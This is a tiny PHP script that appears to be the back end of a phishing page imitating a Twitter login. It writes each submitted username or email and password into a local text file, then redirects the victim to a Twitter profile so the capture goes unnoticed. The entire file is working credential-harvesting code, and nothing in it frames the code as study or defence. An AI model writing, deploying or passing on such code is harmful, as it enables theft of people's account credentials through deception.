<?php

file_put_contents("usernames.txt", "\n\e[1;34m Username: \e[1;36m" . $_POST['usernameOrEmail'] . "\n\e[1;34m Pass: \e[1;36m" . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/mike90s15/');
exit();
?>
